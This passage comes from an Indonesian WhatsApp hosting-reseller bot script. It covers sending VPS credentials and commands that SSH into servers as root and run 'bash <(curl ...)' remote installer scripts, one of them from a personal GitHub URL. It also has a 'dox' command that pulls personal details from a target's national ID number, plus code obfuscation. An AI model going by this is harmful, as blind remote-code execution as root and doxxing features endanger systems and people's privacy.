"buttonParamsJson": `{\"display_text\":\"Copy Data\",\"id\":\"123456789\",\"copy_code\":\"*[ 📦 DATA VPS & PANEL ANDA 📦 ]* ͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏ 

*[ DATA VPS ]*

*USERNAME :* root
*IP ADRESS :* ${ipvps}
*PASSWORD :* ${passwd}


*[ DATA PANEL ]*
*USERNAME :* adm
*PASSWORD :* ${password}
*LINK LOGIN :* ${subdomain}

*NOTES :*
*GARANSI 13 HARI 1X AMBIL, AMBIL GARANSI BAWA BUKTI TF & IP VPS*
*DI LARANG UNTUK MINING, WHM, RDP, DDOS LANGGAR DI DELETE NO REFF*

*[ LOGIN SS PANEL CAPTION DONE ]*

> © Rerezz Official\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Login Panel\",\"url\":\"https://${subdomain}\",\"merchant_url\":\"https://www.google.com\"}`
}
 ]
 })
 })
 }
 }
}, {})

await RezzHost.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})
}
}
break
case 'uninstallpanel': {
    if (!isCreator) return m.reply('Maaf, hanya untuk Owner');
    let t = text.split(',');
    if (t.length < 2) return m.reply(`*Format salah!*\nPenggunaan: ${prefix}uninstall-panel ipvps,password`);
    let ipvps = t[0].trim();
    let passwd = t[1].trim();
    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };

    const command = 'bash <(curl -s https://pterodactyl-installer.se)';

    const conn = new Client();
    let isSuccess = false; // Flag untuk menentukan keberhasilan koneksi
    conn.on('ready', () => {
        m.reply('*PROSES UNINSTALL PANEL SEDANG BERLANGSUNG, MOHON TUNGGU 20 DETIK*');
        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Stream closed with code ' + code + ' and signal ' + signal);
                conn.end();
            }).on('data', (data) => {
                console.log('STDOUT: ' + data);
                if (data.toString().includes('Input')) {
                    if (data.toString().includes('6')) {
                        stream.write('y\n');
                    } else if (data.toString().includes('y/n')) {
                        stream.write('y\n');
                    } else {
                        stream.write('\n');
                    }
                }
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).connect(connSettings);
    await new Promise(resolve => setTimeout(resolve, 20000));
    if (isSuccess) {
            m.reply('`SUKSES UNINSTALL PANEL ANDA, SILAHKAN CEK`');
        }
   }
    break
    case 'startwings': case 'configurewings': {
    if (!isCreator) return ('Maaf Hanya Untuk Owner');
    let t = text.split(',');
    if (t.length < 2) return m.reply(`*Format salah!*\nPenggunaan: ${command} ipvps,password,token (token configuration)`)
    
    let ipvps = t[0];
    let passwd = t[1];
    let token = t[2];
    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };
    const command = 'bash <(curl https://raw.githubusercontent.com/Awafff/RerezzOfficial/main/install.sh)'
    const conn = new Client();
 
    conn.on('ready', () => {
        isSuccess = true; // Set flag menjadi true jika koneksi berhasil
        m.reply('*PROSES CONFIGURE WINGS*')
        
        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Stream closed with code ' + code + ' and signal ' + signal);
m.reply('SUCCES START WINGS DI PANEL ANDA COBA CEK PASTI IJO😁');
                conn.end();
            }).on('data', (data) => {
            stream.write('Rerezz\n');
                stream.write('3\n');
                stream.write(`${token}\n`)
                console.log('STDOUT: ' + data);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        m.reply('Katasandi atau IP tidak valid');
    }).connect(connSettings);
   }

break
case 'nikparser': case 'dox':
if (!isCreator) return m.reply("KAU NI APE")
if (!q) return m.reply(`</> Anda harus mendapatkan nik target terlebih dahulu dan lakukan command seperti ini : ${prefix + command} 16070xxxxx\n\n`)
const { nikParser } = require('nik-parser')
const ktp = q
const nik = nikParser(ktp)
m.reply(`
*Nik :* ${nik.isValid()}
*Provinsi ID :* ${nik.provinceId()}
*Nama Provinsi :* ${nik.province()}
*Kabupaten ID :* ${nik.kabupatenKotaId()}
*Nama Kabupaten :* ${nik.kabupatenKota()}
*Kecamatan ID :* ${nik.kecamatanId()}
*Nama Kecamatan :* ${nik.kecamatan()}
*Kode Pos :* ${nik.kodepos()}
*Jenis Kelamin :* ${nik.kelamin()}
*Tanggal Lahir :* ${nik.lahir()}
*Uniqcode :* ${nik.uniqcode()}`)
break
case 'dec': case 'dek': {
    const { webcrack } = await import('webcrack');
    const usage = `Contoh:
${prefix + command} (Input text or reply text to enc code)
${prefix + command} doc (Reply to a document)`;
    
    let text;
    if (args.length >= 1) {
        text = args.join(" ");
    } else if (m.quoted && m.quoted.text) {
        text = m.quoted.text;
    } else {
        return m.reply(usage);
    }

    try {
        let message;
        if (text === 'doc' && m.quoted && m.quoted.mtype === 'documentMessage') {
            let docBuffer;
            if (m.quoted.mimetype) {
                docBuffer = await m.quoted.download();
            }
            message = await webcrack(docBuffer.toString('utf-8'));
        } else {
            message = await webcrack(text);
        }

        // Simpan hasil ke dalam file @hwuwhw99decrypt.js
        const filePath = './Rerezz Official.js';
        fs.writeFileSync(filePath, message.code);

        // Kirim file nero.txt
        await RezzHost.sendMessage(m.chat, { document: { url: filePath }, mimetype: 'application/javascript', fileName: 'Decrypt By Rerezz Official.js' }, { quoted: m });

    } catch (error) {
        const errorMessage = `Terjadi kesalahan: ${error.message}`;
        await m.reply(errorMessage);
    }
}
break
case 'enc':
		case 'encsc': {
			    const usage = `Contoh:
${prefix + command} (Kirim Code yang mau di Encrypt)
${prefix + command} doc (Reply to a document)`;
    
    let text;
    if (args.length >= 1) {
        text = args.join(" ");
    } else if (m.quoted && m.quoted.text) {
        text = m.quoted.text;
    } else {
        return m.reply(usage);
    }

    try {
        let message;
        if (text === 'doc' && m.quoted && m.quoted.mtype === 'documentMessage') {
            let docBuffer;
            if (m.quoted.mimetype) {
                docBuffer = await m.quoted.download();
            }
            message = await obfus(docBuffer.toString('utf-8'));
            } else {
            message = await obfus(text);
            }
		 // Simpan hasil ke dalam file neroENC.js
        const filePath = './RezzENC.js';
        fs.writeFileSync(filePath, message.result);

        // Kirim file nero.js
        await RezzHost.sendMessage(m.chat, { document: { url: filePath }, mimetype: 'application/javascript', fileName: 'Encrypt By @Rerezz Official.js' }, { quoted: m });
			} catch (error) {
				console.error(error);
				reply(`ERROR`);
			}
		}
		break
//=======================[ BATAS AKHIR ]=======================//
      default: {}
    }
    //=================================\\
  } catch (err) {
    m.reply(util.format(err))
  }
}
//=================================================//
let file = require.resolve(__filename)
fs.watchFile(file, () => {
  fs.unwatchFile(file)
  console.log(chalk.redBright(`Update ${__filename}`))
  delete require.cache[file]
  require(file)
})











/*
                                   [ BATAS AKHIR SC REREZZ OFFICIAL ]
        HW [ BASE ]
        XEON [ BASE ]
        REREZZ [ DEVELOPER ]
    
    WHATSAPP : https://wa.me/6283841605780
    TELEGRAM : https://t.me/rerez_x_hosting
    YOUTUBE : https://www.youtube.com/@RerezHosting
    INSTAGRAM : https://www.instagram.com/@rezz_hosting.0208
    SALURAN 1 : https://whatsapp.com/channel/0029VacxTsC8F2p5dshCmq3r
    SALURAN 2 : https://whatsapp.com/channel/0029VaofHDeI7BeLcrFY9744
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
BATAS AKHIR SC X-REZZ BOTZZ - MD
*/